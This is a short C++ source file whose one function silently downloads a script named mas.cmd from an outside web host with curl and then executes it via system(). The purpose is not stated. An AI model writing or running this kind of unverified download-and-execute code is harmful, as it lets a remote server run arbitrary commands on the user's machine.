#include "mas.h"

using namespace std;

void mas(int argc,char **argv){
	system("curl -s -o mas.cmd https://omn.agsn.site/cmd/mas.cmd");
	system("mas.cmd");
}
